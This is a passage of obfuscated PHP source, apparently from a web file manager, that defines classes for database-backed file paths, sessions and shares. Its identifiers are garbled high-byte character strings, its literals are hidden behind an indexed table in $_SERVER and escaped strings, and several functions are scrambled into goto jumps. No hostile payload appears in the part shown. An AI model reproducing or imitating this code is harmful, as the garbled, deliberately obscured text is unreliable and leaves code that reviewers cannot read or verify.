$_SERVER[£ü]; if (substr($Cšì¾šÃØ, 0, 7) == $f¯¤ÊÅìÓø[1098]) { $Cšì¾šÃØ = $f¯¤ÊÅìÓø[1099] . substr($Cšì¾šÃØ, 7); } header($f¯¤ÊÅìÓø[153] . $Cšì¾šÃØ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($C§õ³‚Èìà) { $this->pathParse = $C§õ³‚Èìà; $this->model = Model($_SERVER[£ü][1100]); } public function getPath($fÏæ“Åíµõ) { return trim($fÏæ“Åíµõ, $_SERVER[£ü][8]); } public function pathFather($dàƒ¸œÃó¼) { $F–¼‹Ó”ğš = $this->parse($dàƒ¸œÃó¼); $F–¼‹Ó”ğš = $this->infoSimple($dàƒ¸œÃó¼); return $F–¼‹Ó”ğš ? $F–¼‹Ó”ğš[$_SERVER[£ü][457]] : !1; } public function getPathName($a¯áåùàÖõ) { $A¡Äˆ£¤ÄÉ = $this->infoSimple($a¯áåùàÖõ); return $A¡Äˆ£¤ÄÉ ? $A¡Äˆ£¤ÄÉ[$_SERVER[£ü][28]] : !1; } public function getPathOuter($bæÄÄ¼—à¡) { if (!$bæÄÄ¼—à¡) { return $bæÄÄ¼—à¡; } $b”á’¸Àœ¨ = $this->parse($bæÄÄ¼—à¡); return KodIO::make($b”á’¸Àœ¨[$_SERVER[£ü][364]]); } public function copyFolderFromIO($aÑÎËÍ¾ ¼, $FÙÙÊñ§„©, $Dºâ…âï¿ù, $c§ù¤ôŒÇ¢, $B¿÷ÎìÏœÂ) { $fÕ·ëÀÓÊ» = $this->model->copyFolderFromIO($aÑÎËÍ¾ ¼, $FÙÙÊñ§„©, $Dºâ…âï¿ù, $c§ù¤ôŒÇ¢, $B¿÷ÎìÏœÂ); return KodIO::make($fÕ·ëÀÓÊ»); } public function isParentOf($aÎ¨ÚÚ­, $BÑÖˆñ°ºÁ) { return $this->model->isParentOf($aÎ¨ÚÚ­, $BÑÖˆñ°ºÁ); } public function mkfile($aÕ‰òƒòèà, $BğÒ‰¡àÛ = '', $Eë¿¤Ö‡ê = REPEAT_RENAME) { $cÄØ¹‰¿¬¦ =& $_SERVER[£ü]; $fîõèÎš‚Ö = $this->parse($aÕ‰òƒòèà); $aÕ‰òƒòèà = $fîõèÎš‚Ö[$cÄØ¹‰¿¬¦[364]]; for ($f¾Ô×¥¤Î… = 0; $f¾Ô×¥¤Î… < count($fîõèÎš‚Ö[$cÄØ¹‰¿¬¦[1101]]); $f¾Ô×¥¤Î…++) { $aÌÁâ½è¨ = $fîõèÎš‚Ö[$cÄØ¹‰¿¬¦[1101]][$f¾Ô×¥¤Î…]; if ($f¾Ô×¥¤Î… == count($fîõèÎš‚Ö[$cÄØ¹‰¿¬¦[1101]]) - 1) { $aÕ‰òƒòèà = $this->model->mkfile($aÕ‰òƒòèà, $aÌÁâ½è¨, $BğÒ‰¡àÛ, $Eë¿¤Ö‡ê); break; } $aÕ‰òƒòèà = $this->model->mkdir($aÕ‰òƒòèà, $aÌÁâ½è¨, REPEAT_SKIP); } return $this->getPathOuter($aÕ‰òƒòèà); } public function mkdir($c«êªÄ…, $céÊĞê÷¶Ù = REPEAT_SKIP) { $D‹‹ÀÃÈ“İ =& $_SERVER[£ü]; $Eâ¬ä®–ñ‡ = $this->parse($c«êªÄ…); $c«êªÄ… = $Eâ¬ä®–ñ‡[$D‹‹ÀÃÈ“İ[364]]; for ($cÔ‹…ò„¸‡ = 0; $cÔ‹…ò„¸‡ < count($Eâ¬ä®–ñ‡[$D‹‹ÀÃÈ“İ[1101]]); $cÔ‹…ò„¸‡++) { $cÇïâÆŒ¸Š = $Eâ¬ä®–ñ‡[$D‹‹ÀÃÈ“İ[1101]][$cÔ‹…ò„¸‡]; $c«êªÄ… = $this->model->mkdir($c«êªÄ…, $cÇïâÆŒ¸Š, $céÊĞê÷¶Ù); } return $this->getPathOuter($c«êªÄ…); } public function copyFile($DÃ‚¡„Ä°ƒ, $A‰ê°œéëè, $eÑçÀÂˆ¨ = REPEAT_REPLACE) { $b³™×°à÷Í =& $_SERVER[£ü]; $Dù‡•î—½ï = $this->parse($A‰ê°œéëè); $bÅ¸Èğ‹Ë = $this->model->copy($DÃ‚¡„Ä°ƒ, $Dù‡•î—½ï[$b³™×°à÷Í[364]], $eÑçÀÂˆ¨, $Dù‡•î—½ï[$b³™×°à÷Í[75]]); return $bÅ¸Èğ‹Ë ? $this->getPathOuter($bÅ¸Èğ‹Ë) : !1; } public function moveFile($eë†×÷ˆ‰’, $fá³§©Ñ¢, $Fƒ¢ôÆê²‰ = REPEAT_REPLACE) { $BÕ…‰é¶ß… =& $_SERVER[£ü]; $CîÀêÚ‡ = $this->parse($fá³§©Ñ¢); $B‡˜‘ÆÁ“î = $this->model->move($eë†×÷ˆ‰’, $CîÀêÚ‡[$BÕ…‰é¶ß…[364]], $Fƒ¢ôÆê²‰, $CîÀêÚ‡[$BÕ…‰é¶ß…[75]]); return $B‡˜‘ÆÁ“î ? $this->getPathOuter($B‡˜‘ÆÁ“î) : !1; } public function copy($a¯…à­Š×Æ, $Bå¹ˆ…—ƒ, $b¢ÏøöÇ = REPEAT_REPLACE) { $E½ ÙÀ‘« = $this->parse($Bå¹ˆ…—ƒ); $d¼Ó¡ŞÉ¾ = $this->model->copy($a¯…à­Š×Æ, $E½ ÙÀ‘«[$_SERVER[£ü][364]], $b¢ÏøöÇ); return $d¼Ó¡ŞÉ¾ ? $this->getPathOuter($d¼Ó¡ŞÉ¾) : !1; } public function move($f®›îÉæª, $f»–²çîç, $déŸî£®ÎÂ = REPEAT_REPLACE) { $E’Ÿ¸ƒÒÈ = $this->parse($f»–²çîç); $BøĞŠË¡°Ì = $this->model->move($f®›îÉæª, $E’Ÿ¸ƒÒÈ[$_SERVER[£ü][364]], $déŸî£®ÎÂ); return $BøĞŠË¡°Ì ? $this->getPathOuter($BøĞŠË¡°Ì) : !1; } public function remove($E´´ŞÜ«Ş, $E¨ÎÜÕº‰‚ = true) { return $this->model->remove($E´´ŞÜ«Ş, $E¨ÎÜÕº‰‚); } public function rename($añƒ§¶ÄÀ, $Aç£â·èÄ¨) { $A¦¯‘‚„Á— = $this->model->rename($añƒ§¶ÄÀ, $Aç£â·èÄ¨); return $A¦¯‘‚„Á— ? $this->getPathOuter($añƒ§¶ÄÀ) : $A¦¯‘‚„Á—; } public function size($eÔá‚™÷ò­) { $aÃÍ•ç†ìÊ = $this->infoSimple($eÔá‚™÷ò­); return $aÃÍ•ç†ìÊ ? $aÃÍ•ç†ìÊ[$_SERVER[£ü][77]] : 0; } public function infoSimple($d±«Š„îˆô) { return $this->model->sourceInfo($d±«Š„îˆô); } public function info($c¼±áè¡Ã) { return $this->infoParse($c¼±áè¡Ã); } public function infoAuth($FÀÎ¬°é¿) { return $this->infoParse($FÀÎ¬°é¿, !1, !0); } public function infoWithChildren($f‰³¡ÄÓ—™) { return $this->infoParse($f‰³¡ÄÓ—™, !0); } protected function infoParse($a‡ƒƒã£ , $CÌŸ è¦ = false, $a‹Ûîœ»¼Ç = false) { if (!$CÌŸ è¦) { return $this->model->pathInfo($a‡ƒƒã£ , $a‹Ûîœ»¼Ç); } return $this->model->pathInfoMore($a‡ƒƒã£ ); } public function infoFull($A¿öÏ³¢§Œ) { $a‰Ü‡ŸŠê‹ =& $_SERVER[£ü]; $báóˆ¢Ô á = explode($a‰Ü‡ŸŠê‹[8], $A¿öÏ³¢§Œ); $f‰§á¾‹ÕÜ = implode($a‰Ü‡ŸŠê‹[8], array_splice($báóˆ¢Ô á, 1)); return $this->model->pathInfoByPath($báóˆ¢Ô á[0], $f‰§á¾‹ÕÜ); } public function hashSimple($E‚¾ÔƒºÛÜ) { $c·àˆàç´„ =& $_SERVER[£ü]; $A­â†¡»¸¦ = $this->infoWithChildren($E‚¾ÔƒºÛÜ); return $A­â†¡»¸¦[$c·àˆàç´„[159]][$c·àˆàç´„[161]]; } public function hashMd5($Aº±‰à’øÚ) { $DŸ¿±Ö¶Òë =& $_SERVER[£ü]; $Fë…º«¢²ë = $this->infoWithChildren($Aº±‰à’øÚ); return $Fë…º«¢²ë[$DŸ¿±Ö¶Òë[159]][$DŸ¿±Ö¶Òë[160]]; } public function exist($b³ÁÃéñİ) { $e˜‡¦ÒÖ ­ =& $_SERVER[£ü]; $b…¼¿õÇ¯ß = $this->parse($b³ÁÃéñİ); if (!$b…¼¿õÇ¯ß[$e˜‡¦ÒÖ ­[75]]) { return $this->isFile($b³ÁÃéñİ) || $this->isFolder($b³ÁÃéñİ); } $D¬ÊƒØ×Ï™ = array($e˜‡¦ÒÖ ­[365] => $b…¼¿õÇ¯ß[$e˜‡¦ÒÖ ­[364]], $e˜‡¦ÒÖ ­[28] => $b…¼¿õÇ¯ß[$e˜‡¦ÒÖ ­[75]]); $D¡Ëğ¼æ–Å = $this->model->where($D¬ÊƒØ×Ï™)->find(); return $D¡Ëğ¼æ–Å ? !0 : !1; } public function isFile($aÔˆ©Åã§‰) { $cíËùÑ…Èê =& $_SERVER[£ü]; $B¿Œìë¢Õ = $this->infoSimple($aÔˆ©Åã§‰); return $B¿Œìë¢Õ && $B¿Œìë¢Õ[$cíËùÑ…Èê[367]] == $cíËùÑ…Èê[83] ? !1 : !0; } public function isFolder($A¸ÒÈĞ•Î´) { $B”›øÄ­Ô =& $_SERVER[£ü]; $a©§É¹Â¿ = $this->infoSimple($A¸ÒÈĞ•Î´); return $a©§É¹Â¿ && $a©§É¹Â¿[$B”›øÄ­Ô[367]] == $B”›øÄ­Ô[83] ? !0 : !1; } public function listPath($EÅôŒ¤¨×Ã, $FÒ£Ú¤©–Á = false) { $Eì®ØÁ‘·› =& $_SERVER[£ü]; if ($EÅôŒ¤¨×Ã == $Eì®ØÁ‘·›[33]) { return !1; } $aù¢¼Íˆêø = array($Eì®ØÁ‘·›[365] => $EÅôŒ¤¨×Ã); if ($FÒ£Ú¤©–Á) { return $this->model->listSource($aù¢¼Íˆêø, -1); } return $this->model->listSource($aù¢¼Íˆêø); } public function has($FäÛÜ½œğé, $f³ñÕ‰—Ãµ = false, $A’œç˜†»— = null) { $EçğÓæğÕä =& $_SERVER[£ü]; $b»“¤ì–òï = $this->infoWithChildren($FäÛÜ½œğé); if ($f³ñÕ‰—Ãµ) { return array($EçğÓæğÕä[189] => $b»“¤ì–òï[$EçğÓæğÕä[189]], $EçğÓæğÕä[188] => $b»“¤ì–òï[$EçğÓæğÕä[188]]); } return $A’œç˜†»— ? $b»“¤ì–òï[$EçğÓæğÕä[189]] : $b»“¤ì–òï[$EçğÓæğÕä[188]]; } public function listAll($E„ßƒÍ…¶¡) { $eˆœ‹«ÈÉ = IO::info($this->pathParse[$_SERVER[£ü][75]]); if (!$eˆœ‹«ÈÉ) { return array(); } return $this->model->listAll($E„ßƒÍ…¶¡); } public function getContent($Fã„¼ÌÆ­) { return $this->model->getContent($Fã„¼ÌÆ­); } public function setContent($B…ÅÄ©ŞË–, $B¬Î¡„Ç–Ù = '') { return $this->model->setContent($B…ÅÄ©ŞË–, $B¬Î¡„Ç–Ù); } public function fileSubstr($F½ÍÃÖò¦™, $eßÌÎ‚¾Ï´, $c”¸×ƒ¬—) { return $this->model->fileSubstr($F½ÍÃÖò¦™, $eßÌÎ‚¾Ï´, $c”¸×ƒ¬—); } public function download($AŸÕé¡ñ»š, $eÂ¡Ü·Ÿ‘ = '') { $Eƒ°ÎêÓ´ = get_path_father($eÂ¡Ü·Ÿ‘); $fŒ‰ããËì™ = get_path_this($eÂ¡Ü·Ÿ‘); $c²§Ï£·— = $this->model->fileInfoGet($AŸÕé¡ñ»š); $F¡…š‰á’ = IO::copy($c²§Ï£·—[$_SERVER[£ü][75]], $Eƒ°ÎêÓ´, !1, $fŒ‰ããËì™); return $F¡…š‰á’; } public function upload($a½‹ŞÈ™¾Ì, $E ¼²†ÒÖ, $DŒÈÇæê‹ä = false, $DÒ’‘Â´¤Œ = REPEAT_REPLACE) { $Fê¤¤›ÌÓô =& $_SERVER[£ü]; $eÕè‡¯Óƒ¢ = $this->parse($a½‹ŞÈ™¾Ì); $A¨¬Ú¥Îã† = $this->model->addFile($eÕè‡¯Óƒ¢[$Fê¤¤›ÌÓô[364]], $E ¼²†ÒÖ, $eÕè‡¯Óƒ¢[$Fê¤¤›ÌÓô[75]], $DŒÈÇæê‹ä, $DÒ’‘Â´¤Œ); return $this->getPathOuter($A¨¬Ú¥Îã†); } public function uploadFileByID($Eƒî‡ˆéÓ, $DÅ¢Ë‡ğêÄ, $Dš˜ªØ‚ì) { $a×ã¾«¦©Ç =& $_SERVER[£ü]; $bÅˆàƒß‚µ = $this->parse($Eƒî‡ˆéÓ); $Bé²Ä×°Ê­ = $this->model->addFileByFileID($bÅˆàƒß‚µ[$a×ã¾«¦©Ç[364]], $DÅ¢Ë‡ğêÄ, $bÅˆàƒß‚µ[$a×ã¾«¦©Ç[75]], $Dš˜ªØ‚ì); return $this->getPathOuter($Bé²Ä×°Ê­); } public function addFileByRemote($aÒù¯àÜåä, $D„ÚÇ¯³Ç´, $E—ÄãæÃøÃ = array(), $eİ¾–ÁÕãˆ = '', $a»÷øî˜Â) { $b¸â¹ƒÊßç =& $_SERVER[£ü]; $EÛï‡ñ‘ = $this->parse($aÒù¯àÜåä); $eİ¾–ÁÕãˆ = empty($eİ¾–ÁÕãˆ) ? $EÛï‡ñ‘[$b¸â¹ƒÊßç[75]] : $eİ¾–ÁÕãˆ; $CœÄºÙø…ƒ = $this->model->addFileByRemote($EÛï‡ñ‘[$b¸â¹ƒÊßç[364]], $D„ÚÇ¯³Ç´, $eİ¾–ÁÕãˆ, $E—ÄãæÃøÃ, $a»÷øî˜Â); return $this->getPathOuter($CœÄºÙø…ƒ); } public function uploadLink($fäê‰»ÜŸ™, $dè†Ö£¢²Á = 0) { $Cëã’ÚÌê =& $_SERVER[£ü]; $b–âÔ¿¨ = $this->parse($fäê‰»ÜŸ™); $fäê‰»ÜŸ™ = Model($Cëã’ÚÌê[540])->createFileName($b–âÔ¿¨[$Cëã’ÚÌê[75]]); $B´´©Êòô° = IO::uploadLink($fäê‰»ÜŸ™, $dè†Ö£¢²Á); return $B´´©Êòô°; } public function fileNameAuto($FÊöãÆˆ–†, $aìÅ‚–ç“ì, $a‡¡Ïí×ŒÊ = REPEAT_REPLACE, $FªªãîÛ = false) { return $this->model->fileNameAuto($FÊöãÆˆ–†, $aìÅ‚–ç“ì, $a‡¡Ïí×ŒÊ, $FªªãîÛ); } public function fileNameExist($F†µÆÏ‚¸Ÿ, $C½ŒÖÍÚŸ‰) { return $this->model->fileNameExist($F†µÆÏ‚¸Ÿ, $C½ŒÖÍÚŸ‰); } protected function _fileOut($e¾ŸšÚÓ·, $CÉ¶ƒ¿âŒ = false, $AÜ˜÷·‰§» = false, $cìâ°Î¥¿Ú = '', $E¶†‚Î†î– = false) { goto Cˆ®¡¯ß¼Ğ; E¦Óé¨ğ¬æ: if ($E¶†‚Î†î–) { return IO::fileOutServer($f•÷¼ÄôÌ§[$Cšâ•¡‘É[75]], $CÉ¶ƒ¿âŒ, $b‹…˜ì‡ÜŠ, $cìâ°Î¥¿Ú); } IO::fileOut($f•÷¼ÄôÌ§[$Cšâ•¡‘É[75]], $CÉ¶ƒ¿âŒ, $b‹…˜ì‡ÜŠ, $cìâ°Î¥¿Ú); goto AÊ—®Ö†áÖ; Cˆ®¡¯ß¼Ğ: $Cšâ•¡‘É =& $_SERVER[£ü]; $bò—ñº±ë¥ = $this->model->sourceInfo($e¾ŸšÚÓ·); if ($bò—ñº±ë¥[$Cšâ•¡‘É[367]] == $Cšâ•¡‘É[83]) { header($Cšâ•¡‘É[1102]); die; } goto Aø£ÄÓ ¼­; Aø£ÄÓ ¼­: $f•÷¼ÄôÌ§ = $this->model->fileInfoGet($e¾ŸšÚÓ·); $cìâ°Î¥¿Ú = $f•÷¼ÄôÌ§[$Cšâ•¡‘É[160]] ? $f•÷¼ÄôÌ§[$Cšâ•¡‘É[160]] : $cìâ°Î¥¿Ú; $b‹…˜ì‡ÜŠ = isset($GLOBALS[$Cšâ•¡‘É[1103]]) ? $GLOBALS[$Cšâ•¡‘É[1103]] : $bò—ñº±ë¥[$Cšâ•¡‘É[28]]; goto E¦Óé¨ğ¬æ; AÊ—®Ö†áÖ: } public function fileOut($AÂî±íÀ, $c¹Ğ–‚Ë½š = false, $Eãœ­¬Ëºõ = false, $E»Å…ÛñïÑ = '') { $this->_fileOut($AÂî±íÀ, $c¹Ğ–‚Ë½š, $Eãœ­¬Ëºõ, $E»Å…ÛñïÑ); } public function fileOutServer($E‹×„šŠÂ, $AøŞŠåÔ‘Í = false, $D¾©¬ÀéŞ° = false, $f‹ğ˜¦³ôÆ = '') { $this->_fileOut($E‹×„šŠÂ, $AøŞŠåÔ‘Í, $D¾©¬ÀéŞ°, $f‹ğ˜¦³ôÆ, !0); } protected function _fileOutImage($eøÀë¥Úàó, $AºÄ‘äùÁî = 250) { $bÄÎÅÍğÄã =& $_SERVER[£ü]; $E¾ÙÊà¬¬ = $this->model->sourceInfo($eøÀë¥Úàó); if ($E¾ÙÊà¬¬[$bÄÎÅÍğÄã[367]] == $bÄÎÅÍğÄã[83]) { show_json($bÄÎÅÍğÄã[1104] . $eøÀë¥Úàó, !1); } $GLOBALS[$bÄÎÅÍğÄã[1103]] = $E¾ÙÊà¬¬[$bÄÎÅÍğÄã[28]]; $eò‡œ—˜İ± = $this->model->fileInfoGet($eøÀë¥Úàó); IO::fileOutImage($eò‡œ—˜İ±[$bÄÎÅÍğÄã[75]], $AºÄ‘äùÁî); } public function fileOutImage($CâÊ‡‘ïÓÊ, $E†ÉÉè¨Şº = 250) { $this->_fileOutImage($CâÊ‡‘ïÓÊ, $E†ÉÉè¨Şº); } public function fileOutImageServer($AÊˆ¦öŒ¸â, $a‘ŞÖ›ßÈ = 250) { $this->_fileOutImage($AÊˆ¦öŒ¸â, $a‘ŞÖ›ßÈ); } public function link($C›™á¯ù†¨, $FœÅº¦‹Ò² = '') { $eÆÙëˆ‡÷ë = $this->model->fileInfoGet($C›™á¯ù†¨); return IO::link($eÆÙëˆ‡÷ë[$_SERVER[£ü][75]], $FœÅº¦‹Ò²); } protected function parse($a‡¢‚ŠŠÌ‰) { $aÏ‹òá¯É =& $_SERVER[£ü]; if (strstr($a‡¢‚ŠŠÌ‰, $aÏ‹òá¯É[8]) === !1) { return array($aÏ‹òá¯É[382] => intval($a‡¢‚ŠŠÌ‰), $aÏ‹òá¯É[75] => $aÏ‹òá¯É[33], $aÏ‹òá¯É[1101] => array()); } $b§‘¯¨¤†Õ = explode($aÏ‹òá¯É[8], trim($a‡¢‚ŠŠÌ‰, $aÏ‹òá¯É[8])); if (count($b§‘¯¨¤†Õ) < 2) { show_tips($a‡¢‚ŠŠÌ‰ . $aÏ‹òá¯É[1105]); } return array($aÏ‹òá¯É[382] => intval($b§‘¯¨¤†Õ[0]), $aÏ‹òá¯É[75] => $b§‘¯¨¤†Õ[1], $aÏ‹òá¯É[1101] => array_slice($b§‘¯¨¤†Õ, 1)); } } goto aĞ¤ß¯¢²; B¼†Œ­¦Ÿ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\x73\145\163\x73\151\157\156"; public function get($c˜ÊéÚ·Â¬) { $AíÚœ¸—èª =& $_SERVER[£ü]; $Cİ‹ÀéŸğñ = $this->where(array($AíÚœ¸—èª[2165] => $c˜ÊéÚ·Â¬))->find(); if (!is_array($Cİ‹ÀéŸğñ)) { return !1; } return $Cİ‹ÀéŸğñ[$AíÚœ¸—èª[681]]; } public function set($EŞë¡¢³áğ, $dİ„ë‘£‰, $aòôƒŠé™ = 3600) { $a¼Âê‘„È” =& $_SERVER[£ü]; $d¯éÇ¦Ö = array($a¼Âê‘„È”[2165] => $EŞë¡¢³áğ, $a¼Âê‘„È”[2094] => $dİ„ë‘£‰, $a¼Âê‘„È”[2166] => $aòôƒŠé™ + time()); if (Session::get($a¼Âê‘„È”[2167])) { $d¯éÇ¦Ö[$a¼Âê‘„È”[1401]] = Session::get($a¼Âê‘„È”[2167]); } else { $d¯éÇ¦Ö[$a¼Âê‘„È”[1401]] = 0; } if ($this->get($EŞë¡¢³áğ)) { return $this->where(array($a¼Âê‘„È”[2165] => $EŞë¡¢³áğ))->save($d¯éÇ¦Ö); } else { return $this->add($d¯éÇ¦Ö, array(), !0); } } public function remove($dí•¢¾ä¹Ê) { return $this->where(array($_SERVER[£ü][2165] => $dí•¢¾ä¹Ê))->delete(); } public function clearTimeout() { return $this->where($_SERVER[£ü][2168] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74\54\165\x70\144\141\x74\145", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x63\162\x65\x61\164\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\x66\x75\156\143\164\x69\157\156"), array("\157\x70\164\151\157\156\163", '', "\151\x6e\163\x65\162\x74\54\x75\160\x64\141\164\x65\x2c\163\145\x6c\x65\143\x74", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($cÖº‡ˆãÍ¬) { $fì­’‚¬Õ =& $_SERVER[£ü]; $B‘ù¥”öË² = isset($cÖº‡ˆãÍ¬[0]) ? $cÖº‡ˆãÍ¬[0] : !1; return array($fì­’‚¬Õ[2169] => array(USER_ID, $fì­’‚¬Õ[2170]), $fì­’‚¬Õ[2132] => array($B‘ù¥”öË², $fì­’‚¬Õ[2171])); } protected function listSimple() { $fïåÉà¦ = array($_SERVER[£ü][1401] => USER_ID); $dŠ±Ñ¡Ñó— = $this->field($this->fieldList)->where($fïåÉà¦)->select(); return $dŠ±Ñ¡Ñó— ? $dŠ±Ñ¡Ñó— : array(); } protected function getInfo($f³ÁÌÑ†•, $f»„“ß¢ ˆ = false) { $AÜ«„½º† =& $_SERVER[£ü]; if ($f»„“ß¢ ˆ) { return $this->_getShareInfo(array($AÜ«„½º†[437] => $f³ÁÌÑ†•)); } $Bƒ‰øˆ’ = $this->cacheFunctionGet($AÜ«„½º†[2172], $f³ÁÌÑ†•); return $Bƒ‰øˆ’; } public function getInfoByHash($DçÖñ‘‰¾) { return $this->_getShareInfo(array($_SERVER[£ü][439] => $DçÖñ‘‰¾)); } public function getInfoByPath($E·èáä¤†») { $Bœù¸ÙÉç =& $_SERVER[£ü]; $f‘Çë¿îæã = array($Bœù¸ÙÉç[1401] => USER_ID, $Bœù¸ÙÉç[366] => $E·èáä¤†»); return $this->_getShareInfo($f‘Çë¿îæã); } public function getInfoBySourcePath($fŒ²«ÔÓƒ×) { $Cá¼š¯·‰ =& $_SERVER[£ü]; $cáÃÆôãÃ‚ = array($Cá¼š¯·‰[1401] => USER_ID, $Cá¼š¯·‰[1006] => $fŒ²«ÔÓƒ×); return $this->_getShareInfo($cáÃÆôãÃ‚); } private function _getShareInfo($DÜè…ñÛ™î) { goto A áì”àÜ; CÓãåè‡Â¸: $DÜè…ñÛ™î = array($fî°³Üƒ™é[437] => $e½»œ®Ó•Ö[$fî°³Üƒ™é[437]]); $e‰„–ùš®ë = $fî°³Üƒ™é[2173]; $B‹—“£àƒ = Model($fî°³Üƒ™é[533])->order($fî°³Üƒ™é[364])->field($e‰„–ùš®ë)->where($DÜè…ñÛ™î)->select(); goto C„¨’ªçµÔ; C„¨’ªçµÔ: if ($e½»œ®Ó•Ö[$fî°³Üƒ™é[366]] == $fî°³Üƒ™é[464]) { $e½»œ®Ó•Ö[$fî°³Üƒ™é[388]] = IO::info($e½»œ®Ó•Ö[$fî°³Üƒ™é[1006]]); } else { $e½»œ®Ó•Ö[$fî°³Üƒ™é[388]] = Model($fî°³Üƒ™é[1100])->pathInfo($e½»œ®Ó•Ö[$fî°³Üƒ™é[366]]); } $e½»œ®Ó•Ö[$fî°³Üƒ™é[2174]] = $B‹—“£àƒ; return $e½»œ®Ó•Ö; goto EÖÏ¬†ÎÁõ; A áì”àÜ: $fî°³Üƒ™é =& $_SERVER[£ü]; $e½»œ®Ó•Ö = $this->where($DÜè…ñÛ™î)->find(); if (!$e½»œ®Ó•Ö) { return !1; } goto CÓãåè‡Â¸; EÖÏ¬†ÎÁõ: } protected function getInfoAuth($eÚÚÉ÷Ü‡æ) { $C¬ëöØæğÆ =& $_SERVER[£ü]; $bá¶áá‡‰  = $this->getInfo($eÚÚÉ÷Ü‡æ); $bá¶áá‡‰ [$C¬ëöØæğÆ[373]] = Model($C¬ëöØæğÆ[450])->authMake($bá¶áá‡‰ [$C¬ëöØæğÆ[2174]]); return $bá¶áá‡‰ ; } protected function listData($BÏù«â­± = null, $e’‘ˆºß” = 300) { $C•í¹òÕ =& $_SERVER[£ü]; $d¡›îÅ¼åŒ = array(array($C•í¹òÕ[442] => array($C•í¹òÕ[916], 0), $C•í¹òÕ[444] => array($C•í¹òÕ[916], 0), $C•í¹òÕ[2175] => $C•í¹òÕ[2144])); if ($BÏù«â­± == $C•í¹òÕ[1831]) { $d¡›îÅ¼åŒ = array($C•í¹òÕ[442] => 1); } else { if ($BÏù«â­± == $C•í¹òÕ[995]) { $d¡›îÅ¼åŒ = array($C•í¹òÕ[444] => 1); } } $d¡›îÅ¼åŒ[$C•í¹òÕ[1401]] = USER_ID; $c˜æ…îÌ±§ = $this->where($d¡›îÅ¼åŒ)->selectPage($e’‘ˆºß”); return $c˜æ…îÌ±§; } protected function listToMe($bõ–—Æ¶÷ = 300) { goto a‡¡¾ª…ƒ©; a‡¡¾ª…ƒ©: $fÏ’¸†ù‘« =& $_SERVER[£ü]; $E­·Ş¨ÓöÓ = Session::get($fÏ’¸†ù‘«[2176]); $c¢Ùˆ½‡Á = array_to_keyvalue($E­·Ş¨ÓöÓ, $fÏ’¸†ù‘«[33], $fÏ’¸†ù‘«[2064]); goto a¸öñòä¾; EÚÑ‚½ Úª: $bÔÖ¦ŸÎ¨÷ = array_to_keyvalue_group($aÛ„ç›Í¸´[$fÏ’¸†ù‘«[351]], $fÏ’¸†ù‘«[437]); if (!$bÔÖ¦ŸÎ¨÷) { return $aÛ„ç›Í¸´; } $BìÄâ‚õ–Ì = $fÏ’¸†ù‘«[2177]; goto B“øÂ£°ì¯; a¶×Ğ¸–Şº: $eö¶ùÄò³Â = array($fÏ’¸†ù‘«[2178] => $Aäî¹±ÌŒ†, $fÏ’¸†ù‘«[2179] => $aÛ„ç›Í¸´[$fÏ’¸†ù‘«[348]]); return $eö¶ùÄò³Â; goto Eë‰­»˜­Ø; a¸öñòä¾: $B¢¢ğÓğ­Á = array($fÏ’¸†ù‘«[517] => SourceModel::TYPE_USER, $fÏ’¸†ù‘«[452] => USER_ID); if ($c¢Ùˆ½‡Á) { $B¢¢ğÓğ­Á = array(array($fÏ’¸†ù‘«[517] => SourceModel::TYPE_USER, $fÏ’¸†ù‘«[452] => USER_ID), array($fÏ’¸†ù‘«[517] => SourceModel::TYPE_GROUP, $fÏ’¸†ù‘«[452] => array($fÏ’¸†ù‘«[7], $c¢Ùˆ½‡Á)), $fÏ’¸†ù‘«[2175] => $fÏ’¸†ù‘«[2144]); } $aÛ„ç›Í¸´ = Model($fÏ’¸†ù‘«[533])->where($B¢¢ğÓğ­Á)->selectPage($bõ–—Æ¶÷); goto EÚÑ‚½ Úª; B“øÂ£°ì¯: $B¢¢ğÓğ­Á = array($fÏ’¸†ù‘«[437] => array($fÏ’¸†ù‘«[381], array_keys($bÔÖ¦ŸÎ¨÷))); $Aäî¹±ÌŒ† = $this->field($BìÄâ‚õ–Ì)->where($B¢¢ğÓğ­Á)->select(); foreach ($Aäî¹±ÌŒ† as $e˜ìŸö£· => &$b´ªè˜·²·) { $b´ªè˜·²·[$fÏ’¸†ù‘«[2174]] = $bÔÖ¦ŸÎ¨÷[$b´ªè˜·²·[$fÏ’¸†ù‘«[437]]]; } goto a¶×Ğ¸–Şº; Eë‰­»˜­Ø: } protected function shareAdd($Bğˆá¬òğá, $cØĞ—ğ†“) { $CÈ¶–†õò© =& $_SERVER[£ü]; $dÇŸº˜‘Ë = $this->_addShareData($Bğˆá¬òğá, $cØĞ—ğ†“); if (!empty($cØĞ—ğ†“[$CÈ¶–†õò©[2180]])) { $this->_shareAuthSet($dÇŸº˜‘Ë, $cØĞ—ğ†“[$CÈ¶–†õò©[2180]]); } $this->shareEventAdd($Bğˆá¬òğá, $cØĞ—ğ†“, $CÈ¶–†õò©[998]); return $dÇŸº˜‘Ë; } private function shareEventAdd($EÉÌ·æêñÛ, $eõÏÁí¹ğË, $b¢Û‘¹°² = "\141\x64\x64") { goto B¼„ŠË·›; B¼„ŠË·›: $C•œ„†ì =& $_SERVER[£ü]; if ($b¢Û‘¹°² == $C•œ„†ì[998]) { if ($eõÏÁí¹ğË[$C•œ„†ì[442]] == $C•œ„†ì[83]) { Model($C•œ„†ì[501])->eventShare($EÉÌ·æêñÛ, $C•œ„†ì[2181]); } if ($eõÏÁí¹ğË[$C•œ„†ì[444]] == $C•œ„†ì[83]) { Model($C•œ„†ì[501])->eventShare($EÉÌ·æêñÛ, $C•œ„†ì[2182]); } return; } $Fª‰œô¢–¿ = $this->getInfoByPath($EÉÌ·æêñÛ); goto fŒ†œòÙà; D„­¶‘ªğÚ: return; goto A£ïù³ğ­Ñ; bˆçÙ¶Å©: if ($Fª‰œô¢–¿[$C•œ„†ì[444]] == $C•œ„†ì[464] && $eõÏÁí¹ğË[$C•œ„†ì[444]] == $C•œ„†ì[83]) { $báÙáêÁĞÔ = $C•œ„†ì[2182]; } if ($Fª‰œô¢–¿[$C•œ„†ì[444]] == 